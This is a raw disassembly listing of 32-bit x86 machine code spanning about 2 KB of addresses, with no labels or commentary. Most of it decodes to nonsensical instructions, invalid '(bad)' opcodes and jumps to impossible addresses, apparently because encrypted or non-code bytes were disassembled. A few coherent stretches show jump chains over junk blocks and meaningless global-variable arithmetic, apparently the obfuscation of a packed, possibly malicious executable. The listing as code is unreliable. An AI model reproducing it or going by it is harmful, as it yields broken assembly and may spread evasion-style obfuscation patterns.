  40ce68:	mov    eax,0xb4c3c50f
  40ce6d:	wbinvd 
  40ce6f:	xchg   ebx,eax
  40ce70:	or     ebx,DWORD PTR [esi-0x68d43c5e]
  40ce76:	jno    0x40ce5a
  40ce78:	push   ds
  40ce79:	lods   eax,DWORD PTR ds:[esi]
  40ce7a:	xchg   edi,eax
  40ce7b:	and    BYTE PTR [ecx+0x5c],bl
  40ce7e:	xchg   edi,eax
  40ce7f:	add    ebx,esp
  40ce81:	ret    
  40ce82:	sub    dl,BYTE PTR [esi+edi*1]
  40ce85:	sub    DWORD PTR [ebx-0x260e837a],esp
  40ce8b:	push   eax
  40ce8c:	ret    
  40ce8d:	push   ebp
  40ce8e:	sbb    ebp,DWORD PTR [eax]
  40ce90:	outs   dx,WORD PTR ds:[esi]
  40ce92:	and    al,0xa8
  40ce94:	(bad)  
  40ce95:	loope  0x40ce7e
  40ce97:	sbb    ch,ah
  40ce99:	mov    al,ds:0xcb7e98e2
  40ce9e:	dec    ecx
  40ce9f:	imul   esp,DWORD PTR [edi-0x1e037abc],0x7d
  40cea6:	add    DWORD PTR [eax],esp
  40cea8:	std    
  40cea9:	jnp    0x40cf09
  40ceab:	mov    dh,0x40
  40cead:	fstp   DWORD PTR [edx+0x593eb1ba]
  40ceb3:	jle    0x40ce7c
  40ceb5:	sub    al,0x89
  40ceb7:	cmp    DWORD PTR [ebp-0xb],edx
  40ceba:	jp     0x40cf1f
  40cebc:	sub    DWORD PTR [edx],0xffffffd3
  40cebf:	mov    al,BYTE PTR [esi]
  40cec1:	and    DWORD PTR [esp+esi*1+0xe],eax
  40cec5:	dec    esp
  40cec6:	fld    DWORD PTR [edx]
  40cec8:	or     esp,DWORD PTR [edi+0x235a5642]
  40cece:	fwait
  40cecf:	pusha  
  40ced0:	loopne 0x40ce60
  40ced2:	das    
  40ced3:	stos   BYTE PTR es:[edi],al
  40ced4:	pop    esp
  40ced5:	dec    eax
  40ced6:	jecxz  0x40cea0
  40ced8:	pop    edi
  40ced9:	fld    QWORD PTR [edi+0xe9cc08]
  40cedf:	inc    esi
  40cee0:	addr16 ret 
  40cee2:	add    DWORD PTR [edx+0x2a953e4f],edi
  40cee8:	inc    edi
  40cee9:	ins    BYTE PTR es:[edi],dx
  40ceea:	mov    ebp,0x6239c7e1
  40ceef:	repz mov ebx,DWORD PTR [ebx]
  40cef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cef3:	pop    ecx
  40cef4:	jecxz  0x40cec4
  40cef6:	jmp    0x87adeb9a
  40cefb:	sub    al,0x2c
  40cefd:	mov    bh,0x1
  40ceff:	test   ebx,0x62aa4169
  40cf05:	pop    ds
  40cf06:	jg     0x40cf14
  40cf08:	outs   dx,DWORD PTR ds:[esi]
  40cf09:	sub    cl,ch
  40cf0b:	and    al,0x9a
  40cf0d:	sbb    BYTE PTR [ebx],bl
  40cf0f:	cmp    BYTE PTR [ecx+0x143c403],0x4a
  40cf16:	cmp    cl,BYTE PTR [ebp+0x60]
  40cf19:	cmc    
  40cf1a:	or     ebx,DWORD PTR [esi-0x56]
  40cf1d:	rcl    ah,1
  40cf1f:	cmp    BYTE PTR [esi+0xa],dl
  40cf22:	dec    esp
  40cf23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf24:	repnz pop edi
  40cf26:	push   ebp
  40cf27:	fcom   DWORD PTR [eax]
  40cf2a:	clc    
  40cf2b:	fadd   DWORD PTR [edx+edx*4]
  40cf2e:	retf   0x19fc
  40cf31:	popf   
  40cf32:	jb     0x40cf32
  40cf34:	pop    es
  40cf35:	adc    al,0xf7
  40cf37:	jecxz  0x40ced4
  40cf39:	sub    eax,0xbb7bbc7a
  40cf3e:	fisubr WORD PTR [esi]
  40cf40:	push   ebp
  40cf41:	sar    BYTE PTR [ecx+eiz*8-0x3e1ecdc8],0xe3
  40cf49:	jmp    0xe5a54c20
  40cf4e:	and    edi,eax
  40cf50:	dec    ebp
  40cf51:	inc    eax
  40cf52:	jb     0x40cf9a
  40cf54:	jp     0x40cf14
  40cf56:	pop    ds
  40cf57:	mov    bl,0xf8
  40cf59:	or     edx,DWORD PTR [ebx]
  40cf5b:	fdivp  st(5),st
  40cf5d:	in     eax,0x44
  40cf5f:	test   DWORD PTR [edx-0x3b6b659f],ecx
  40cf65:	mov    ebp,0x101bef4d
  40cf6a:	imul   ebx,DWORD PTR [esi+0x3d],0x9b71af1a
  40cf71:	push   ds
  40cf72:	lds    esp,FWORD PTR [edx]
  40cf74:	jle    0x40cfa4
  40cf76:	retf   
  40cf77:	fst    QWORD PTR [eax]
  40cf79:	ins    BYTE PTR es:[edi],dx
  40cf7a:	add    BYTE PTR [eax+0x77],bh
  40cf7d:	xchg   esi,eax
  40cf7e:	or     DWORD PTR [edx+edx*1],edx
  40cf81:	popa   
  40cf82:	xlat   BYTE PTR ds:[ebx]
  40cf83:	mov    bh,BYTE PTR [esi+0x67]
  40cf86:	pop    esi
  40cf87:	pop    edx
  40cf88:	jg     0x40cf3c
  40cf8a:	pop    ds
  40cf8b:	push   ss
  40cf8c:	je     0x40b5e7
  40cf92:	mov    eax,0x800f1c81
  40cf97:	jmp    0x40b5ee
  40cf9c:	push   ebp
  40cf9d:	mov    ebp,esp
  40cf9f:	sub    esp,0x60
  40cfa2:	sbb    DWORD PTR ds:0x42a865,0x18d1
  40cfac:	mov    eax,DWORD PTR [ebp+0x8]
  40cfaf:	xor    DWORD PTR ds:0x42a899,0x42a77d
  40cfb9:	jmp    0x40d211
  40cfbe:	ror    esp,1
  40cfc0:	mov    dh,0xc5
  40cfc3:	fcmovbe st,st(1)
  40cfc5:	(bad)  [esi]
  40cfc7:	push   ds
  40cfc8:	aad    0x62
  40cfca:	sbb    BYTE PTR [edi-0x58d5707f],ch
  40cfd0:	js     0x40d04a
  40cfd2:	xor    eax,0xe778787e
  40cfd7:	add    ebp,eax
  40cfd9:	ja     0x40cfb6
  40cfdb:	aas    
  40cfdc:	mov    ah,0xd0
  40cfde:	push   cs
  40cfdf:	push   ebx
  40cfe0:	ins    BYTE PTR es:[edi],dx
  40cfe1:	call   0x952b:0xfc6a1f49
  40cfe8:	inc    eax
  40cfe9:	sbb    BYTE PTR [eax],ah
  40cfeb:	ss (bad) 
  40cfed:	lahf   
  40cfee:	enter  0x33f,0x76
  40cff2:	mov    dh,0x78
  40cff4:	aam    0xbe
  40cff6:	pop    es
  40cff7:	cmp    ch,ah
  40cff9:	push   eax
  40cffa:	and    esp,DWORD PTR [ecx+0x69edc161]
  40d000:	xor    ah,BYTE PTR [ecx+0x56]
  40d003:	aaa    
  40d004:	(bad)  
  40d005:	retf   0xf944
  40d008:	outs   dx,DWORD PTR ds:[esi]
  40d009:	xchg   DWORD PTR [edx+esi*2-0x72c5b47f],ebp
  40d010:	(bad)  
  40d011:	sbb    al,0xe1
  40d013:	pop    ebp
  40d014:	rcr    DWORD PTR [ecx],1
  40d016:	aaa    
  40d017:	in     al,0x99
  40d019:	xchg   ebx,eax
  40d01a:	fwait
  40d01b:	lea    esi,[eax]
  40d01d:	test   ebp,ebp
  40d01f:	adc    ecx,edi
  40d021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d022:	retf   0x7ebc
  40d025:	jecxz  0x40d09a
  40d027:	popa   
  40d028:	in     eax,0xbc
  40d02a:	mov    bl,0xb7
  40d02c:	lock es dec ebx
  40d02f:	xor    eax,DWORD PTR [ebx+edx*8]
  40d032:	pop    ecx
  40d033:	(bad)
  40d036:	mov    ebp,0xbc821949
  40d03b:	imul   edi,DWORD PTR [esi],0xffffffdc
  40d03e:	pushf  
  40d03f:	sbb    esp,DWORD PTR [ecx]
  40d041:	and    DWORD PTR [ecx-0x9],esp
  40d044:	jo     0x40d00d
  40d046:	adc    esp,DWORD PTR gs:[esi+0x7113e917]
  40d04d:	(bad)  
  40d04e:	mov    ecx,0xeafe9e07
  40d053:	mov    WORD PTR [edx+0x71],es
  40d056:	sbb    al,BYTE PTR ds:0x15ccfdfd
  40d05c:	mov    edx,0x55d94d1a
  40d061:	pop    edi
  40d062:	cdq    
  40d063:	dec    esi
  40d064:	std    
  40d065:	ins    BYTE PTR es:[edi],dx
  40d066:	push   es
  40d067:	sar    DWORD PTR [edi-0x43f5a8f5],0x67
  40d06e:	push   ecx
  40d06f:	aad    0x91
  40d071:	mov    ebp,0x9477b2bf
  40d076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d077:	das    
  40d078:	jle    0x40d052
  40d07a:	scas   al,BYTE PTR es:[edi]
  40d07b:	fnstsw WORD PTR [edi-0x12c4a5de]
  40d081:	mov    ch,0x25
  40d083:	test   al,0xdd
  40d085:	(bad)  
  40d086:	ds addr16 xchg esi,eax
  40d089:	xor    eax,0x5d0cdd36
  40d08e:	pop    edi
  40d08f:	hlt    
  40d090:	lods   al,BYTE PTR ds:[esi]
  40d091:	adc    BYTE PTR [esi-0x424b60f5],dh
  40d097:	or     DWORD PTR [ebx+esi*2-0x4ba9795c],edi
  40d09e:	pusha  
  40d09f:	xchg   ebp,eax
  40d0a0:	dec    ebx
  40d0a1:	mov    ah,0xe7
  40d0a3:	lahf   
  40d0a4:	xchg   ebp,eax
  40d0a5:	call   DWORD PTR [edx-0x144a3965]
  40d0ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0ac:	sbb    al,0x9a
  40d0ae:	mov    eax,ds:0xb75f359b
  40d0b3:	mov    dl,0xd3
  40d0b5:	sub    DWORD PTR [esp+ebx*1-0x73506ad6],esp
  40d0bc:	mov    al,ds:0x8bf5e1a5
  40d0c1:	fcomp  DWORD PTR [esi-0x4a5415ba]
  40d0c7:	add    al,BYTE PTR [edx+edi*8]
  40d0ca:	and    al,BYTE PTR [ecx-0x55a7e94a]
  40d0d0:	daa    
  40d0d1:	or     DWORD PTR [edx],edx
  40d0d3:	pushf  
  40d0d4:	inc    ebp
  40d0d5:	jo     0x40d08d
  40d0d7:	call   FWORD PTR [edi]
  40d0d9:	je     0x40d111
  40d0db:	mov    eax,ds:0xb5470c85
  40d0e0:	mov    ds:0xe5d33970,eax
  40d0e5:	in     al,dx
  40d0e6:	(bad)  
  40d0e7:	push   eax
  40d0e8:	push   0x0
  40d0ea:	loop   0x40d073
  40d0ec:	dec    esi
  40d0ed:	pop    es
  40d0ee:	into   
  40d0ef:	je     0x40d10e
  40d0f1:	mov    esi,gs
  40d0f3:	cli    
  40d0f4:	iret   
  40d0f5:	in     eax,0x6e
  40d0f7:	add    al,0xce
  40d0f9:	push   es
  40d0fa:	test   ebp,ebp
  40d0fc:	imul   edx,DWORD PTR fs:[edx+0x70],0x3dcebaff
  40d104:	sub    al,0x98
  40d106:	stos   DWORD PTR es:[edi],eax
  40d107:	fldenv [edx]
  40d109:	fwait
  40d10a:	jnp    0x40d0cf
  40d10c:	sar    DWORD PTR [edx+0x4ca2e2c1],1
  40d112:	cmp    ch,al
  40d114:	xlat   BYTE PTR ds:[ebx]
  40d115:	retf   
  40d116:	pushf  
  40d117:	push   esp
  40d118:	(bad)  
  40d119:	sub    eax,DWORD PTR [ebx]
  40d11b:	ins    DWORD PTR es:[edi],dx
  40d11c:	xchg   esi,eax
  40d11d:	scas   al,BYTE PTR es:[edi]
  40d11e:	push   0xb13975ad
  40d123:	bound  ebx,QWORD PTR [esi+0x7e]
  40d126:	jne    0x40d0e8
  40d128:	sbb    eax,0x385caa4f
  40d12d:	std    
  40d12e:	cli    
  40d12f:	fisttp QWORD PTR [eax-0x6c]
  40d132:	into   
  40d133:	leave  
  40d134:	nop
  40d135:	outs   dx,BYTE PTR ds:[esi]
  40d136:	push   eax
  40d137:	out    dx,eax
  40d138:	imul   eax,ebx,0x7337c9a4
  40d13e:	fdivr  QWORD PTR [ebp+0x44647ca6]
  40d144:	inc    esi
  40d145:	cmp    BYTE PTR [esi-0x21cfec79],bl
  40d14b:	loop   0x40d102
  40d14d:	cmp    BYTE PTR [edx],ah
  40d14f:	cli    
  40d150:	jbe    0x40d162
  40d152:	pop    esi
  40d153:	xor    BYTE PTR [edx+0x3e2c6546],al
  40d159:	div    BYTE PTR [ecx+0x55]
  40d15c:	dec    ebx
  40d15d:	push   ds
  40d15e:	adc    ebp,DWORD PTR [ebx-0x7b8ddabf]
  40d164:	jbe    0x40d1cf
  40d166:	pop    esp
  40d167:	hlt    
  40d168:	adc    bh,BYTE PTR [edx+0x67]
  40d16b:	xchg   cl,bh
  40d16d:	setp   BYTE PTR [edx]
  40d170:	push   0x4860e640
  40d175:	fwait
  40d176:	aam    0xb4
  40d178:	out    dx,eax
  40d179:	inc    ebp
  40d17a:	xchg   edx,eax
  40d17b:	push   eax
  40d17c:	and    BYTE PTR [esi-0x5],cl
  40d17f:	push   eax
  40d180:	int3   
  40d181:	pop    ecx
  40d182:	xor    DWORD PTR fs:[esi],eax
  40d185:	in     eax,dx
  40d186:	leave  
  40d187:	jnp    0x40d1df
  40d189:	lahf   
  40d18a:	call   0x8080:0x8e93223d
  40d191:	loopne 0x40d1f5
  40d193:	push   ds
  40d194:	push   edi
  40d195:	repz mov edx,0xf7c82770
  40d19b:	out    0x92,al
  40d19d:	xchg   edi,eax
  40d19e:	mov    WORD PTR [ecx],ss
  40d1a0:	lods   al,BYTE PTR ds:[esi]
  40d1a1:	jne    0x40d181
  40d1a3:	(bad)  
  40d1a4:	loop   0x40d177
  40d1a6:	jmp    0x301e:0xaf09c119
  40d1ad:	stc    
  40d1ae:	out    0xad,eax
  40d1b0:	mov    DWORD PTR [edx+0x7e1eec22],esp
  40d1b6:	add    al,BYTE PTR [edx-0x47b4d39c]
  40d1bc:	mov    al,0x8c
  40d1be:	xor    al,0xdd
  40d1c0:	add    bl,BYTE PTR [eax-0x321c5a90]
  40d1c6:	pop    esp
  40d1c7:	xor    eax,0xdcf412a4
  40d1cc:	mov    esp,0xe40bc70c
  40d1d2:	lea    edx,[ecx+0x9e67ae3]
  40d1d8:	add    BYTE PTR [esi+0x5cb00fda],dh
  40d1de:	jp     0x40d1fe
  40d1e0:	lahf   
  40d1e1:	(bad)  
  40d1e2:	arpl   WORD PTR [edx+0x41],bx
  40d1e5:	or     BYTE PTR ds:0xb01aa847,bh
  40d1eb:	bound  eax,QWORD PTR [eax+0x1faf7201]
  40d1f1:	call   ebp
  40d1f3:	div    BYTE PTR [ebx+eax*8+0x4e7db6b4]
  40d1fa:	cs add eax,0xc199ee2e
  40d200:	adc    ch,bh
  40d202:	(bad)
  40d205:	ret    0x9643
  40d208:	aam    0xce
  40d20a:	repz les eax,FWORD PTR [ebx+0x64]
  40d20e:	(bad)
  40d211:	push   ebx
  40d212:	push   esi
  40d213:	and    DWORD PTR ds:0x42a7d5,0x0
  40d21d:	jmp    0x40d22f
  40d222:	mov    ebx,DWORD PTR ds:0x42a7d5
  40d228:	inc    ebx
  40d229:	mov    DWORD PTR ds:0x42a7d5,ebx
  40d22f:	cmp    DWORD PTR ds:0x42a7d5,0x1d
  40d236:	jae    0x40d254
  40d23c:	cmp    DWORD PTR ds:0x42a7d5,0x26
  40d243:	jne    0x40d24f
  40d249:	call   DWORD PTR ds:0x41d24c
  40d24f:	jmp    0x40d222
  40d254:	mov    esi,0x7510850
  40d259:	movzx  ebx,WORD PTR ds:0x42a795
  40d260:	xor    ebx,DWORD PTR ds:0x42a77d
  40d266:	mov    DWORD PTR ds:0x42a795,ebx
  40d26c:	xor    eax,esi
  40d26e:	or     ebx,0x7ad4
  40d274:	mov    ebx,0x327298
  40d279:	adc    DWORD PTR ds:0x42a7dd,0x42a899
  40d283:	add    eax,ebx
  40d285:	sub    DWORD PTR ds:0x42a8a9,0x2a37
  40d28f:	push   edi
  40d290:	mov    DWORD PTR [ebp-0x18],eax
  40d293:	adc    DWORD PTR ds:0x42a899,0x18
  40d29d:	mov    edi,DWORD PTR [ebp+0x8]
  40d2a0:	neg    DWORD PTR ds:0x42a865
  40d2a6:	xor    edi,esi
  40d2a8:	jmp    0x40d500
  40d2ad:	int    0xca
  40d2af:	iret   
  40d2b0:	retf   0xd9db
  40d2b3:	(bad)  
  40d2b5:	and    ah,ah
  40d2b7:	push   ecx
  40d2b8:	pusha  
  40d2b9:	xchg   BYTE PTR [eax+0x5d],al
  40d2bc:	ja     0x40d2a5
  40d2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d2bf:	js     0x40d339
  40d2c1:	xor    eax,0xda78787e
  40d2c6:	sbb    eax,0x934fc622
  40d2cb:	jg     0x40d34c
  40d2cd:	inc    ebx
  40d2ce:	push   eax
  40d2cf:	inc    edx
  40d2d0:	jne    0x40d32b
  40d2d2:	jg     0x40d271
  40d2d4:	inc    esp
  40d2d5:	not    esp
  40d2d7:	mov    dh,0xf1
  40d2d9:	sbb    ah,ah
  40d2db:	dec    edx
  40d2dc:	enter  0xe3b5,0x55
  40d2e0:	xchg   al,cl
  40d2e2:	psubsw mm1,QWORD PTR [ebx]
  40d2e5:	ror    DWORD PTR [edi],0xc4
  40d2e8:	icebp  
  40d2e9:	inc    esp
  40d2ea:	xchg   dh,dh
  40d2ec:	mov    bl,0xbb
  40d2ee:	das    
  40d2ef:	mov    bl,0xe8
  40d2f1:	mov    ds:0xa2a6f044,eax
  40d2f6:	jbe    0x40d30a
  40d2f8:	xchg   BYTE PTR [ebp-0xd03666b],al
  40d2fe:	adc    BYTE PTR [ecx+esi*4-0xb],al
  40d302:	xor    eax,0x3b3a5f8
  40d307:	mov    ebx,0x2d812643
  40d30c:	(bad)  
  40d30d:	shl    BYTE PTR [ecx+0x4c35aa48],cl
  40d313:	push   edi
  40d314:	lods   eax,DWORD PTR ds:[esi]
  40d315:	dec    esi
  40d316:	and    DWORD PTR [eax-0x35cd20c4],edx
  40d31c:	push   esp
  40d31d:	(bad)  
  40d31e:	call   0xe474c395
  40d323:	mov    ebp,0xe8425c77
  40d328:	push   0x3712c922
  40d32d:	push   ebp
  40d32e:	mov    ch,0xa
  40d330:	adc    eax,0x1947151c
  40d335:	sub    al,0xed
  40d337:	jns    0x40d2e0
  40d339:	mov    bh,0x3
  40d33b:	and    al,al
  40d33d:	(bad)  
  40d33e:	mov    esp,DWORD PTR [esi+0x7c]
  40d341:	clc    
  40d342:	repnz out 0x45,al
  40d345:	mov    bl,0x28
  40d347:	pop    es
  40d348:	mov    al,0x95
  40d34a:	and    al,0x7b
  40d34c:	mov    al,0x15
  40d34e:	aas    
  40d34f:	cs lock xor dh,dl
  40d353:	out    0xe7,eax
  40d355:	or     ebx,DWORD PTR [eax+eax*2-0x438a9b23]
  40d35c:	mov    BYTE PTR [esi+0x1531bde2],dl
  40d362:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d363:	ret    0x21b3
  40d366:	dec    edi
  40d367:	sub    esi,edi
  40d369:	cmp    esp,DWORD PTR [edx+esi*8+0x1aeff2b9]
  40d370:	lds    esp,FWORD PTR [eax-0x9cbdeff]
  40d376:	inc    edx
  40d377:	mov    cl,0xf1
  40d379:	cmp    ebx,eax
  40d37b:	sbb    DWORD PTR ds:0x46a132b5,esp
  40d381:	push   cs
  40d382:	or     eax,0xe8e32882
  40d387:	and    BYTE PTR ds:0xd092f0c0,ch
  40d38d:	push   eax
  40d38e:	lea    edi,[edi+0x7e]
  40d391:	clc    
  40d392:	fsub   QWORD PTR [edi-0x7c7a8ca]
  40d398:	and    ch,BYTE PTR [ebx]
  40d39a:	and    DWORD PTR [esi+0x77bb4348],edi
  40d3a0:	or     dl,BYTE PTR [ebx+ebp*8+0x51c7882f]
  40d3a7:	push   ebp
  40d3a8:	stos   DWORD PTR es:[edi],eax
  40d3a9:	data16 jne 0x40d3d3
  40d3ac:	ins    DWORD PTR es:[edi],dx
  40d3ad:	popa   
  40d3ae:	jl     0x40d35b
  40d3b0:	mov    ss,edi
  40d3b2:	fxch   st(0)
  40d3b4:	(bad)
  40d3b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b9:	(bad)  
  40d3bb:	or     cl,BYTE PTR [esp+eax*1-0x13d9a5a0]
  40d3c2:	fstp   QWORD PTR [edi+0xb38e22d]
  40d3c8:	push   ebx
  40d3c9:	or     al,0x29
  40d3cb:	fiadd  WORD PTR [ecx-0x5e04e653]
  40d3d1:	pusha  
  40d3d2:	jl     0x40d419
  40d3d4:	jge    0x40d438
  40d3d6:	xchg   edi,eax
  40d3d7:	xchg   edi,eax
  40d3d8:	pop    ecx
  40d3d9:	mov    ebp,0x73ba2df7
  40d3de:	iret   
  40d3df:	mov    edi,0x3200e6e1
  40d3e4:	jl     0x40d455
  40d3e6:	inc    edi
  40d3e7:	sbb    DWORD PTR ds:[edi+0x3d],ebx
  40d3eb:	iret   
  40d3ec:	lahf   
  40d3ed:	ror    BYTE PTR [edi-0x29b46ed1],0x80
  40d3f4:	les    esp,FWORD PTR [edi+0x48d83810]
  40d3fa:	xchg   BYTE PTR [eax-0x58],dh
  40d3fd:	xor    eax,0xba92175
  40d402:	cmp    eax,DWORD PTR [ebx]
  40d404:	jl     0x40d3ea
  40d406:	add    BYTE PTR [edx+0x39624a68],bl
  40d40c:	int3   
  40d40d:	int3   
  40d40e:	sbb    al,0x59
  40d410:	pop    eax
  40d411:	lods   al,BYTE PTR ds:[esi]
  40d412:	add    eax,DWORD PTR [edi]
  40d414:	out    dx,al
  40d415:	and    DWORD PTR [ebp+0xd],0xfd8cb227
  40d41c:	or     BYTE PTR [edx-0x36],bh
  40d41f:	and    DWORD PTR [edx],esp
  40d421:	daa    
  40d422:	push   esi
  40d423:	in     al,dx
  40d424:	xchg   esi,eax
  40d425:	fwait
  40d426:	ins    BYTE PTR es:[edi],dx
  40d427:	aaa    
  40d428:	aaa    
  40d429:	pop    es
  40d42a:	aaa    
  40d42b:	add    BYTE PTR [esi],0x8d
  40d42e:	gs adc eax,0xb9cd5974
  40d434:	add    BYTE PTR [edx+0x496a6d19],cl
  40d43a:	adc    dh,ah
  40d43c:	sahf   
  40d43d:	pop    ds
  40d43e:	cmp    eax,ecx
  40d440:	mov    ebp,0xbb07facc
  40d445:	lock imul esi,DWORD PTR [edx-0x23d605f3],0xd3fa65ff
  40d450:	pop    ds
  40d451:	dec    ebp
  40d452:	push   edx
  40d453:	shl    BYTE PTR [ecx+0x34],1
  40d456:	adc    BYTE PTR [ebp+0x129e3237],ch
  40d45c:	add    eax,0x4f8019e5
  40d461:	(bad)  
  40d462:	std    
  40d463:	retf   0xf2c6
  40d466:	mov    ds:0x9f3ae52c,eax
  40d46b:	mov    edx,eax
  40d46d:	into   
  40d46e:	aas    
  40d46f:	pop    edi
  40d470:	and    edx,ecx
  40d472:	xchg   edi,ebp
  40d474:	pop    ss
  40d475:	adc    eax,0xa9c2970f
  40d47a:	add    eax,0x5c32fe54
  40d47f:	cmp    BYTE PTR [ebx-0x28],dl
  40d482:	add    eax,edi
  40d484:	and    ch,bh
  40d486:	call   0x8dc4d282
  40d48b:	pop    edx
  40d48c:	sbb    ebp,eax
  40d48e:	imul   eax,DWORD PTR [ecx+0x316bda7e],0xe3d4c602
  40d498:	xchg   esp,eax
  40d499:	sub    al,0xfe
  40d49b:	xor    ebp,DWORD PTR [edi+ebx*4-0x2e]
  40d49f:	push   ebp
  40d4a0:	push   es
  40d4a1:	push   eax
  40d4a2:	mov    WORD PTR [edi+0x53d14297],fs
  40d4a8:	mov    eax,0xe2d684b0
  40d4ad:	cwde   
  40d4ae:	imul   edi,DWORD PTR [esi+0x7f],0x19
  40d4b2:	cmp    ecx,DWORD PTR [esp]
  40d4b5:	mov    ch,0x31
  40d4b7:	xor    cl,BYTE PTR [ecx+0x77]
  40d4ba:	repnz mov BYTE PTR [ecx-0x12],dl
  40d4be:	mov    bl,0x49
  40d4c0:	stos   BYTE PTR es:[edi],al
  40d4c1:	stos   BYTE PTR es:[edi],al
  40d4c2:	pop    ecx
  40d4c3:	and    eax,DWORD PTR [ebx+0x23]
  40d4c6:	out    dx,eax
  40d4c7:	das    
  40d4c8:	jg     0x40d4a1
  40d4ca:	adc    al,0xaf
  40d4cc:	mov    eax,ds:0xaa7b91c6
  40d4d1:	mov    dl,BYTE PTR [esi]
  40d4d3:	mov    ebx,0x1085190c
  40d4d8:	jmp    0xdb1:0xa6c740f
  40d4df:	(bad)  
  40d4e0:	dec    ebx
  40d4e1:	mov    edi,0x917de8de
  40d4e6:	add    eax,0xbaca34e5
  40d4eb:	ss pop edi
  40d4ed:	sub    al,0xb2
  40d4ef:	lock xchg esp,eax
  40d4f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d4f2:	sbb    ah,BYTE PTR [ebp-0x4512d1fa]
  40d4f8:	outs   dx,BYTE PTR ds:[esi]
  40d4f9:	xor    DWORD PTR [ecx],0x4a18c137
  40d4ff:	std    
  40d500:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  40d507:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  40d50e:	and    DWORD PTR ds:0x42a815,0x42a825
  40d518:	add    edi,ebx
  40d51a:	jmp    0x40e985
  40d51f:	cmp    edi,0x3f
  40d522:	jne    0x40d55a
  40d528:	mov    eax,0x337e
  40d52d:	mov    eax,ds:0x41e966
  40d532:	mov    eax,DWORD PTR [eax]
  40d534:	mov    DWORD PTR [ebp-0x14],eax
  40d537:	mov    eax,ds:0x41eb6e
  40d53c:	mov    DWORD PTR ds:0x42a789,0x45db
  40d546:	mov    eax,DWORD PTR [eax]
  40d548:	mov    DWORD PTR [ebp-0x18],eax
  40d54b:	mov    DWORD PTR ds:0x42a7ed,0x1d30
  40d555:	jmp    0x40e979
  40d55a:	mov    DWORD PTR ds:0x42a855,0x19ca
  40d564:	jmp    0x40d7bc
  40d569:	leave  
  40d56a:	ret    
  40d56b:	enter  0xd6c6,0xd9
  40d56f:	fld    st(3)
  40d571:	int    0x93
  40d573:	fdiv   st,st(0)
  40d575:	sub    ch,BYTE PTR [edx+esi*8-0x1d]
  40d579:	pushf  
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	js     0x40d5f5
  40d57d:	xor    eax,0x5478787e
  40d582:	xor    ch,BYTE PTR [ecx-0x576c8a37]
  40d588:	cmp    BYTE PTR [ebx],dl
  40d58a:	push   ebp
  40d58b:	and    eax,0x40f3791e
  40d590:	push   ss
  40d591:	loope  0x40d59c
  40d593:	dec    esi
  40d594:	scas   eax,DWORD PTR es:[edi]
  40d595:	fsubr  st(0),st
  40d597:	push   edi
  40d598:	push   edi
  40d599:	pop    eax
  40d59a:	sub    eax,0x6c79d825
  40d59f:	push   edi
  40d5a0:	or     DWORD PTR [ebx-0x319b8a5a],0xffffffc3
  40d5a7:	imul   ebx,DWORD PTR [esi+0x21e454f2],0x4202086c
  40d5b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b2:	and    DWORD PTR [ebx+ebp*4],0x6d
  40d5b6:	xor    edx,DWORD PTR [esi-0x11]
  40d5b9:	xor    eax,0x804c7760
  40d5be:	fucomi st,st(2)
  40d5c0:	mov    ebx,0xce395ab2
  40d5c5:	rcl    DWORD PTR [eax+0x6ab46ae2],0xd
  40d5cc:	xchg   ecx,eax
  40d5cd:	shl    cl,0xe3
  40d5d0:	int3   
  40d5d1:	pop    ds
  40d5d2:	dec    esi
  40d5d3:	sub    eax,esp
  40d5d5:	xchg   esi,eax
  40d5d6:	(bad)  
  40d5d7:	test   BYTE PTR [ebx-0x32],0xdf
  40d5db:	addr16 out 0x74,eax
  40d5de:	push   ecx
  40d5df:	jmp    0x5ad1:0xd58e7640
  40d5e6:	mov    dh,0x57
  40d5e8:	loop   0x40d60b
  40d5ea:	cld    
  40d5eb:	das    
  40d5ec:	imul   edi,edi,0x2b
  40d5ef:	add    DWORD PTR gs:[edi],eax
  40d5f2:	outs   dx,DWORD PTR ds:[esi]
  40d5f3:	mov    esi,DWORD PTR [ecx]
  40d5f5:	ins    DWORD PTR es:[edi],dx
  40d5f6:	sti    
  40d5f7:	mov    al,ds:0x98614ed
  40d5fc:	cli    
  40d5fd:	cwde   
  40d5fe:	push   eax
  40d5ff:	ins    DWORD PTR es:[edi],dx
  40d600:	sbb    ah,BYTE PTR [ecx]
  40d602:	stc    
  40d603:	mov    dh,0x2e
  40d605:	pop    ebx
  40d606:	fs aad 0xdc
  40d609:	sar    ch,1
  40d60b:	aas    
  40d60c:	lea    ebp,[edi-0x4c5ab06f]
  40d612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d613:	xor    al,0x61
  40d615:	in     al,dx
  40d616:	inc    esi
  40d617:	call   0xc4864cc3
  40d61c:	push   eax
  40d61d:	loope  0x40d5e9
  40d61f:	and    al,0x43
  40d621:	cmp    BYTE PTR [esi-0x15b5bdc5],cl
  40d627:	jge    0x40d67a
  40d629:	mov    dh,cl
  40d62b:	jmp    0x9e35e2a6
  40d630:	cwde   
  40d631:	mov    bl,0x4c
  40d633:	loop   0x40d5f3
  40d635:	enter  0x8f4d,0xae
  40d639:	dec    edx
  40d63a:	out    0x96,eax
  40d63c:	jns    0x40d6b0
  40d63e:	icebp  
  40d63f:	in     eax,0x73
  40d641:	popfw  
  40d643:	les    edi,FWORD PTR [edx-0x1bee1d78]
  40d649:	shr    BYTE PTR [esi+eiz*1-0x57f59b4],1
  40d650:	xor    eax,0xfaa15740
  40d655:	jp     0x40d5e8
  40d657:	sbb    cl,BYTE PTR [esi+0x60]
  40d65a:	sub    esi,DWORD PTR es:[esi+0x630c21b2]
  40d661:	sub    al,0x28
  40d663:	lods   eax,DWORD PTR ds:[esi]
  40d664:	dec    ebp
  40d665:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40d667:	mov    ebp,0x4ec731f5
